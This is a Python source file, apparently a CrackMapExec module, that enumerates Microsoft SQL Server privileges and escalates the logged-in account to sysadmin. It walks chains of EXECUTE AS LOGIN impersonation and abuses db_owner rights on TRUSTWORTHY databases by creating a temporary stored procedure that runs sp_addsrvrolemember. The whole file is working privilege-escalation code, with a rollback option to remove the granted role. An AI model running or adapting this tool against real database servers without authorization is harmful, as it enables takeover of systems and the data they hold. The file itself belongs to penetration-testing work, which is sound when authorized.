#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author:
#  Romain de Reydellet (@pentest_soka)


from cme.helpers.logger import highlight


class User:
    def __init__(self, username):
        # current username
        self.username = username
        # user(s) we can impersonate
        self.grantors = []
        self.parent = None
        self.is_sysadmin = False
        self.dbowner = None

    def __str__(self):
        return f"User({self.username})"


class CMEModule:
    """
    Enumerate MSSQL privileges and exploit them
    """

    name = "mssql_priv"
    description = "Enumerate and exploit MSSQL privileges"
    supported_protocols = ["mssql"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self):
        self.admin_privs = None
        self.current_user = None
        self.current_username = None
        self.mssql_conn = None
        self.action = None
        self.context = None

    def options(self, context, module_options):
        """
        ACTION    Specifies the action to perform:
            - enum_priv (default)
            - privesc
            - rollback (remove sysadmin privilege)
        """
        self.action = None
        self.context = context

        if "ACTION" in module_options:
            self.action = module_options["ACTION"]

    def on_login(self, context, connection):
        # get mssql connection
        self.mssql_conn = connection.conn
        # fetch the current user
        self.current_username = self.get_current_username()
        self.current_user = User(self.current_username)
        self.current_user.is_sysadmin = self.is_admin()
        self.current_user.dbowner = self.check_dbowner_privesc()

        if self.action == "rollback":
            if not self.current_user.is_sysadmin:
                self.context.log.fail(f"{self.current_username} is not sysadmin")
                return
            if self.remove_sysadmin_priv():
                self.context.log.success("sysadmin role removed")
            else:
                self.context.log.success("failed to remove sysadmin role")
            return

        if self.current_user.is_sysadmin:
            self.context.log.success(f"{self.current_username} is already a sysadmin")
            return

        # build path
        self.perform_impersonation_check(self.current_user)
        # look for a privesc path
        target_user = self.browse_path(context, self.current_user, self.current_user)
        if self.action == "privesc":
            if not target_user:
                self.context.log.fail("can't find any path to privesc")
            else:
                exec_as = self.build_exec_as_from_path(target_user)
                # privesc via impersonation privilege
                if target_user.is_sysadmin:
                    self.do_impersonation_privesc(self.current_username, exec_as)
                # privesc via dbowner privilege
                elif target_user.dbowner:
                    self.do_dbowner_privesc(target_user.dbowner, exec_as)
            if self.is_admin_user(self.current_username):
                self.context.log.success(f"{self.current_username} is now a sysadmin! " + highlight("({})".format(self.context.conf.get("CME", "pwn3d_label"))))

    def build_exec_as_from_path(self, target_user):
        path = [target_user.username]
        parent = target_user.parent
        while parent:
            path.append(parent.username)
            parent = parent.parent
        # remove the last one
        path.pop(-1)
        return self.sql_exec_as(reversed(path))

    def browse_path(self, context, initial_user: User, user: User) -> User:
        if initial_user.is_sysadmin:
            self.context.log.success(f"{initial_user.username} is sysadmin")
            return initial_user
        elif initial_user.dbowner:
            self.context.log.success(f"{initial_user.username} can privesc via dbowner")
            return initial_user
        for grantor in user.grantors:
            if grantor.is_sysadmin:
                self.context.log.success(f"{user.username} can impersonate: " f"{grantor.username} (sysadmin)")
                return grantor
            elif grantor.dbowner:
                self.context.log.success(f"{user.username} can impersonate: {grantor.username} (which can privesc via dbowner)")
                return grantor
            else:
                self.context.log.display(f"{user.username} can impersonate: {grantor.username}")
            return self.browse_path(context, initial_user, grantor)

    def query_and_get_output(self, query):
        # try:
        results = self.mssql_conn.sql_query(query)
        # self.mssql_conn.printRows()
        # query_output = self.mssql_conn._MSSQL__rowsPrinter.getMessage()
        # query_output = results.strip("\n-")
        return results
        # except Exception as e:
        #     return False

    def sql_exec_as(self, grantors: list) -> str:
        exec_as = []
        for grantor in grantors:
            exec_as.append(f"EXECUTE AS LOGIN = '{grantor}';")
        return "".join(exec_as)

    def perform_impersonation_check(self, user: User, grantors=[]):
        # build EXECUTE AS if any grantors is specified
        exec_as = self.sql_exec_as(grantors)
        # do we have any privilege ?
        if self.update_priv(user, exec_as):
            return
        # do we have any grantors ?
        new_grantors = self.get_impersonate_users(exec_as)
        for new_grantor in new_grantors:
            # skip the case when we can impersonate ourself
            if new_grantor == user.username:
                continue
            # create a new user and add it as a grantor of the current user
            if new_grantor not in grantors:
                new_user = User(new_grantor)
                new_user.parent = user
                user.grantors.append(new_user)
                grantors.append(new_grantor)
                # perform the same check on the grantor
                self.perform_impersonation_check(new_user, grantors)

    def update_priv(self, user: User, exec_as=""):
        if self.is_admin_user(user.username):
            user.is_sysadmin = True
            return True
        user.dbowner = self.check_dbowner_privesc(exec_as)
        return user.dbowner

    def get_current_username(self) -> str:
        return self.query_and_get_output("select SUSER_NAME()")[0][""]

    def is_admin(self, exec_as="") -> bool:
        res = self.query_and_get_output(exec_as + "SELECT IS_SRVROLEMEMBER('sysadmin')")
        self.revert_context(exec_as)
        is_admin = res[0][""]
        self.context.log.debug(f"IsAdmin Result: {is_admin}")
        if is_admin:
            self.context.log.debug(f"User is admin!")
            self.admin_privs = True
            return True
        else:
            return False

    def get_databases(self, exec_as="") -> list:
        res = self.query_and_get_output(exec_as + "SELECT name FROM master..sysdatabases")
        self.revert_context(exec_as)
        self.context.log.debug(f"Response: {res}")
        self.context.log.debug(f"Response Type: {type(res)}")
        tables = [table["name"] for table in res]
        return tables

    def is_dbowner(self, database, exec_as="") -> bool:
        query = f"""select rp.name as database_role
      from [{database}].sys.database_role_members drm
      join [{database}].sys.database_principals rp
        on (drm.role_principal_id = rp.principal_id)
      join [{database}].sys.database_principals mp
        on (drm.member_principal_id = mp.principal_id)
      where rp.name = 'db_owner' and mp.name = SYSTEM_USER"""
        self.context.log.debug(f"Query: {query}")
        res = self.query_and_get_output(exec_as + query)
        self.context.log.debug(f"Response: {res}")
        self.revert_context(exec_as)
        if res:
            if "database_role" in res[0] and res[0]["database_role"] == "db_owner":
                return True
            else:
                return False
        return False

    def find_dbowner_priv(self, databases, exec_as="") -> list:
        match = []
        for database in databases:
            if self.is_dbowner(database, exec_as):
                match.append(database)
        return match

    def find_trusted_db(self, exec_as="") -> list:
        query = """SELECT d.name AS DATABASENAME
    FROM sys.server_principals r
    INNER JOIN sys.server_role_members m
        ON r.principal_id = m.role_principal_id
    INNER JOIN sys.server_principals p ON
    p.principal_id = m.member_principal_id
    inner join sys.databases d
        on suser_sname(d.owner_sid) = p.name
    WHERE is_trustworthy_on = 1 AND d.name NOT IN ('MSDB')
        and r.type = 'R' and r.name = N'sysadmin'"""
        res = self.query_and_get_output(exec_as + query)
        self.revert_context(exec_as)
        return res

    def check_dbowner_privesc(self, exec_as=""):
        databases = self.get_databases(exec_as)
        dbowner = self.find_dbowner_priv(databases, exec_as)
        trusted_db = self.find_trusted_db(exec_as)
        # return the first match
        for db in dbowner:
            if db in trusted_db:
                return db
        return None

    def do_dbowner_privesc(self, database, exec_as=""):
        # change context if necessary
        self.query_and_get_output(exec_as)
        # use database
        self.query_and_get_output(f"use {database};")
        query = f"""CREATE PROCEDURE sp_elevate_me
            WITH EXECUTE AS OWNER
            as
            begin
            EXEC sp_addsrvrolemember '{self.current_username}','sysadmin'
            end"""
        self.query_and_get_output(query)
        self.query_and_get_output("EXEC sp_elevate_me;")
        self.query_and_get_output("DROP PROCEDURE sp_elevate_me;")
        self.revert_context(exec_as)

    def do_impersonation_privesc(self, username, exec_as=""):
        # change context if necessary
        self.query_and_get_output(exec_as)
        # update our privilege
        self.query_and_get_output(f"EXEC sp_addsrvrolemember '{username}', 'sysadmin'")
        self.revert_context(exec_as)

    def get_impersonate_users(self, exec_as="") -> list:
        query = """SELECT DISTINCT b.name
                   FROM  sys.server_permissions a
                   INNER JOIN sys.server_principals b
                   ON a.grantor_principal_id = b.principal_id
                   WHERE a.permission_name like 'IMPERSONATE%'"""
        res = self.query_and_get_output(exec_as + query)
        # self.context.log.debug(f"Result: {res}")
        self.revert_context(exec_as)
        users = [user["name"] for user in res]
        return users

    def remove_sysadmin_priv(self) -> bool:
        res = self.query_and_get_output(f"EXEC sp_dropsrvrolemember '{self.current_username}', 'sysadmin'")
        return not self.is_admin()

    def is_admin_user(self, username) -> bool:
        res = self.query_and_get_output(f"SELECT IS_SRVROLEMEMBER('sysadmin', '{username}')")
        try:
            if int(res):
                self.admin_privs = True
                return True
            else:
                return False
        except:
            return False

    def revert_context(self, exec_as):
        self.query_and_get_output("REVERT;" * exec_as.count("EXECUTE"))
